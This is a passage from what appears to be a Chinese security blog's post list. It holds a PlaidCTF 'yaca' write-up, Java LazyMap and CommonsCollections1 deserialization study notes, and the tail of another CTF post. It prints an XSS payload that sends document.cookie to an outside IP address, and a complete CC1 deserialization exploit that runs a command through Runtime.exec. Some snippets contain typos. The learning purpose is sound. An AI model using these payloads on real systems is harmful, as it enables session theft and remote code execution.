get_pypin(gd,ma,cg)</span><br></pre></td></tr></table></figure>

<p>拿到pin码以后就可以执行命令</p>
<p>然后比较奇怪的地方就是，有的时候console页面会显示not found，这里出题人给出的意见是</p>
<p>清除缓存即可。</p>
<h2 id="oh-my-lotto"><a href="#oh-my-lotto" class="headerlink" title="oh-my-lotto"></a>oh-my-lotto</h2><p>拿到flag的条件是让forecast==lotto_result，因此</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/15/java%E5%AE%A1%E8%AE%A1-lazymap/">java审计-lazymap</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-15</time><div class="content"><h2 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h2><p>学习了前面，我们知道在这个利用链中，比较关键的是需要有调动到transform类的方法，因为transform的四个方法组合一下，最终才能成功执行命令，但是在前面我们使用TransformedMap来执行命令的，而在Ysoserial中使用的是<code>lazymap</code>，关键的代码在于其get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(map.contain(Key)==<span class="keyword">false</span>)&#123;</span><br><span class="line">           Object value = factory.transform(key);</span><br><span class="line">           map.put(key,value);</span><br><span class="line">           <span class="keyword">return</span> value;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.get(key)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p>在Lazymap，想要利用这个get方法，需要使用AnnotationInvocationHandler类的invoke方法</p>
<h2 id="java对象代理"><a href="#java对象代理" class="headerlink" title="java对象代理"></a>java对象代理</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>实现类似php的魔术方法_call，劫持一个对象内部的方法调用——<code>java.reflect.Proxy</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),Class[] &#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>

<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h3><p>Proxy.newProxyInstance的第一个参数是ClassLoader,，默认即可，第二个参数是需要代理的对象的集合，第三个参数是实现了InvocationHandler接口的对象，里面包含具体代理的逻辑</p>
<p>eg:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExampleInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExampleInvocationHandler</span><span class="params">(Map map)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy,Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(method.getName().compareTo(<span class="string">&quot;get&quot;</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Method.getName());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.map,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ExampleInvocationHandler类实现了invoke方法，作用是检测到调用方法名get的时候返回a和方法名</p>
<p>外部调用这个ExampleInvocationHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler; </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy; </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; </span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	InvocationHandler handler = <span class="keyword">new</span> ExampleInvocationHandler(<span class="keyword">new</span> HashMap());</span><br><span class="line">        Map proxyMap=(Map) Proxy.newwPorxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,hander);</span><br><span class="line">        </span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;wo&quot;</span>);</span><br><span class="line">        String result=(String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="触发Lazymap过程"><a href="#触发Lazymap过程" class="headerlink" title="触发Lazymap过程"></a>触发Lazymap过程</h3><p>1.AnnotationInvocationHandler是一个invocationhandler</p>
<p>2.我们将其对象进行proxy，在使用readObject时，调用任意方法，即进入invoke方法中，就会触发Lazymap#get</p>
<h2 id="LazyMap构造利用链"><a href="#LazyMap构造利用链" class="headerlink" title="LazyMap构造利用链"></a>LazyMap构造利用链</h2><p>1.使用Lazymap替换TransformedMap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>对象进行Proxy：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">Map proxyMap= (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> Class[] &#123;Map.class&#125;,handler);</span><br></pre></td></tr></table></figure>

</li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/09/2022plaidctf/">2022plaidctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-09</time><div class="content"><h2 id="yaca"><a href="#yaca" class="headerlink" title="yaca"></a>yaca</h2><p>主要的漏洞点在这个位置,这里的content-type可以替换成其他内容，这样可以动态执行js的内容这里描述一下两种方法</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220411210553.png" alt="image-20220411210545854"></p>
<h3 id="importmap"><a href="#importmap" class="headerlink" title="importmap"></a>importmap</h3><p>这个是队内师傅做出来的方法，参考链接：<a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps">https://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps</a></p>
<p>content-type设为<code>importmap</code>的时候，可以动态加载js的代码，方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;importmap&quot;&gt;</span><br><span class="line">&#123;</span><br><span class="line">	&quot;imports&quot;:&#123;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>由于无法导入外部的js，所以我们只能劫持本地的js，通过动态加载本地的eval-code.mjs也可以实现，结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;type&quot;:&quot;importmap&quot;,</span><br><span class="line">	&quot;program&quot;:&#123;</span><br><span class="line">	&quot;name&quot;:&quot;new program&quot;,</span><br><span class="line">	&quot;scopes&quot;:&#123;</span><br><span class="line">	&quot;&#x2F;js&#x2F;&quot;:&#123;</span><br><span class="line">	&quot;&#x2F;js&#x2F;ast-to-js.mjs&quot;:&quot;&#x2F;js&#x2F;eval-code.mjs&quot;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;,</span><br><span class="line">	&quot;code&quot;:&quot;&#123;\&quot;code\&quot;:\&quot;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;110.42.133.120:9999?flag&#x3D;&#39;+document.cookie\&quot;,\&quot;variables\&quot;:[]&#125;&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复现成功</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220411230221.png" alt="image-20220411230221385"></p>
<h3 id="如何调用eval-code-js"><a href="#如何调用eval-code-js" class="headerlink" title="如何调用eval-code.js"></a>如何调用eval-code.js</h3><p>上面其他部分的原理都挺清晰的，就是这里如何调用有些问题,<del>想要看调用过程还得去debug吧</del>debug失败，所以还是继续读了一下源码，发现在calc中存在evalCode和js的eval也是一个东西，重点关注一下传入参数的方式以及参数</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220412202636.png"></p>
<p>可以发现在cacl计算模块当中使用的方法是这样的，传一个参数名为code，并且为json格式的即可</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220412221902.png" alt="image-20220412221902165"></p>
<p>执行的流程如下：一开始已经经过计算了，后面用再一次导入这个mjs文件，总共是导入两次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;js&#x2F;eval-code.mjs</span><br></pre></td></tr></table></figure>

<p>在第二次的时候执行了code里面的code参数，劫持成功</p>
<h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>这题想要解出来，首先要定位到那个content，一开始再看这个题目的时候，就感觉这里挺奇怪的，不过那两天有其他事情要做，所以就没怎么看了，然后接下来需要理清楚的是：<br>1.可以使用这个importmap类型进行操作，而这个类型是允许导入其他js模块进行动态加载的，由于不能导入其他外部，只能调用内部的，而这个eval-code.mjs，其实翻一下文件就可以发现了<br>2.对这个文件进行调用的方式为:主要是针对文件的源码进行审计。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/04/06/java-CommonCollections1%E5%88%A9%E7%94%A8/">java_CommonCollections1利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-04-06</time><div class="content"><h2 id="CommonCollections1利用链"><a href="#CommonCollections1利用链" class="headerlink" title="CommonCollections1利用链"></a>CommonCollections1利用链</h2><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>从P神的demo来理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">          <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">          <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">              <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来学习一下里面的接口和类</p>
<h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap用于对java标准数据结构Map做一个修饰，被修饰过的Map在添加新的元素时，将可以执行一个回调。我们通过下面这行代码对innerMap进行修饰，传出的outerMap即是修饰后的Map:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，keyTransformer是处理新元素的key的回调，valueTransormer是处理新元素的value的回调。我们所说的回调，并不是传统意义上的回调函数，而是一个实现了Transformer接口的类。</p>
<p>Transformer的作用是：对其集合的元素进行增加，删除或修改时调用transform方法进行<code>特定的修饰变换</code>，而这个transform是我们自己定义的</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，它只有一个待实现的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> object <span class="title">transform</span><span class="params">(object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调用transform方法，这个过程就类似在调用一个“回调函数”，这个回调的参数是原始对象。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是实现了Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，并在transform方法将这个对象再返回。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">	iConstant=constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用是 包装任意一个对象，并且在执行回调时，返回这个对象，方便后续操作。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer是实现了Transformer接口的一个类，这个类可以用来执行任意方法，也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传入三个参数，第一个参数是待执行的方法名，第二个参数是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class paramTypes, Object[] args)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">    iMethodName=methodName;</span><br><span class="line">    iParamTypes=paramTypes;</span><br><span class="line">    iArgs=args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面的回调transform方法，就是执行了input对象的iMethodName方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(object input)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(input == <span class="keyword">null</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		Class cls=input.getClass();</span><br><span class="line">		Method method = cls.getMethod(iMethodName,iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input,iArgs);</span><br><span class="line">	&#125;<span class="keyword">catch</span>(NoSuchMethodException ex)&#123;</span><br><span class="line">	 <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span>+iMethodName+<span class="string">&quot;&#x27;on&#x27;&quot;</span>+input.getClass() + <span class="string">&quot;&#x27;does not exist&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (IllegalAccessException ex)&#123;</span><br><span class="line">	<span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +</span><br><span class="line">iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer的作用是将内部的多个Transformer串在一起，将前一个回调返回的结果，作为后一个回调的参数传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span></span>&#123;</span><br><span class="line">	<span class="keyword">super</span>();</span><br><span class="line">	iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt; iTransformers.length; i ++)&#123;</span><br><span class="line">		object = iTransformers[i].transform(object);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="理解demo"><a href="#理解demo" class="headerlink" title="理解demo"></a>理解demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">         <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">         <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">             <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span>&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>

<p>通过新建一个ChainedTransformer，一开始包含了两个Transformer；第一个是ConstantTransformer，根据前面的学习，他的作用是构造函数的构造函数的时候传入一个对象，并在transform方法的时候将这个对象返回，而invokerTransformer，则是执行Runtime对象的exec，参数是后面的地址。</p>
<p>此时的ransformerChain将内部的多个TransformedMap串接在一起，将其和封装入innerMap，通过<strong>在Map中放入一个新元素</strong>触发回调</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">      Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line">      outerMap.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="用TransformedMap编写POC"><a href="#用TransformedMap编写POC" class="headerlink" title="用TransformedMap编写POC"></a>用TransformedMap编写POC</h2><p>要触发上面CC链，需要在Map中放入一个新元素来实现触发。因此我们需要找到一个链，在反序列化的起点readObject逻辑里有写入操作。</p>
<p>这个类就是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，其readObject方法中，我们重点关注一下写入部分的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">memberValue.setValue( <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy( value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember( annotationType.members().get(name)));</span><br></pre></td></tr></table></figure>

<p>其中memberValues就是反序列化后得到的Map，也是经过了TransormedMap修饰的对象，这里遍历了它的所有元素，并依次设置值，在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，那么就会执行我们上面构造的代码。</p>
<p> 由于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是jdk内部的类，不能直接使用new来实例化，所以需要使用反射来获取到其构造方法，，而这个类的构造函数有两个参数，第一个参数是Annotation类，第二个参数是前面构造的Map。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor construct= clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">construc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object obj=construc.newInstance(Retention.class,outerMap);</span><br></pre></td></tr></table></figure>

<h3 id="为什么要使用反射"><a href="#为什么要使用反射" class="headerlink" title="为什么要使用反射"></a>为什么要使用反射</h3><p>通过使用以下代码，我们可以获得序列化流，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ByteArrayOutputStream barr&#x3D; new ByteArrayOutputStream();</span><br><span class="line">       ObjectOutputStream oos&#x3D; new ObjectOutputStream(barr);</span><br><span class="line">       oos.writeObject(obj);</span><br><span class="line">       oos.close();</span><br></pre></td></tr></table></figure>

<p>值得注意的是:<strong>待序列化的对象和所有它使用的内部属性对象，必须都实现<code>java.io.Serializable</code>接口</strong>，但是最早传给ConstantTransformaer的是Runtime.getRuntime(),Runtime类是没有实现java.io.Serializable接口，所以不允许被序列化。</p>
<p>​    因此我们可以通过反射来获取到上下文中的Runtime对象，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method f = Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Runtime r=(Runtime) f.invoke(<span class="keyword">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>转化为Transformer的写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">	<span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">	<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">		String.class,</span><br><span class="line">		Class.class</span><br><span class="line">	&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        Object.class,</span><br><span class="line">        Object[].class</span><br><span class="line">    &#125;,</span><br><span class="line">     <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">        String.class</span><br><span class="line">    &#125;,</span><br><span class="line">    	<span class="keyword">new</span> String[]&#123;</span><br><span class="line">            <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span></span><br><span class="line">        &#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个和前面的区别在于，Runtime.getRuntime()换成了Runtime.class，前者为java.lang.Runtime对象，后者为java.lang.Class对象</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                String.class,</span><br><span class="line">                Class[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,</span><br><span class="line">                Object[].class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;,</span><br><span class="line">                <span class="keyword">new</span> String[]&#123;</span><br><span class="line">                    <span class="string">&quot;C:\\Windows\\System32\\calc.exe&quot;</span></span><br><span class="line">                &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain= <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        Map outerMap=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformerChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) construct.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr= <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos= <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o=(Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

